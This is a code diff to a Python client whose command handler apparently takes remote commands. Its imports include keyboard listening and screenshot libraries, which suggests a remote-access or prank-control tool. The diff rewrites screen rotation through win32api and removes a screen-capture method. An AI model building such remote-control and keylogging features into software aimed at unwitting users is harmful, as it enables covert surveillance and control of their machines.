@@ -11,6 +11,7 @@ import rotatescreen
 import pyautogui
 import cv2
 import numpy as np
+import win32con
 from pynput.keyboard import Key, Listener
 from getpass import getuser
 from util import Console
@@ -148,22 +149,27 @@ class ClientCommands:
                 rotate = cmd.split()
                 deg = int(rotate[1].replace("deg=",""))
                 if len(rotate) == 2:
-                    screen = rotatescreen.get_primary_display()
-                    (lambda: screen.rotate_to([deg for i in [0,90,180,270] if deg == i][0]))()
-                    return f"Rotated {deg} degrees"
+                    r = 0
+                    if deg == 180:
+                        rs = win32con.DMDO_180
+                    elif((deg == 90)):
+                        rs = win32con.DMDO_270
+                    elif ((deg == 270)):   
+                        rs = win32con.DMDO_90
+                    elif deg == 0:
+                        rs = win32con.DMDO_DEFAULT
+                    device = win32api.EnumDisplayDevices(None,r)
+                    dm = win32api.EnumDisplaySettings(device.DeviceName,win32con.ENUM_CURRENT_SETTINGS)
+                    if (dm.DisplayOrientation + rs)  % 2==1:
+                        dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth   
+                    dm.DisplayOrientation = rs
+                    win32api.ChangeDisplaySettingsEx(device.DeviceName,dm)
             else:
                 return "Unknown command"
 
         except Exception:
             return " "
-
-    def getframe(self):
-        screen = pyautogui.screenshot()
-        frame = np.array(screen)
-        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        frame = cv2.resize(frame, (1024, 576), interpolation=cv2.INTER_AREA)
-        return frame
-
+            
     def alertMSG(self,cmd:str) -> str:
         msg = ""
         count = 0
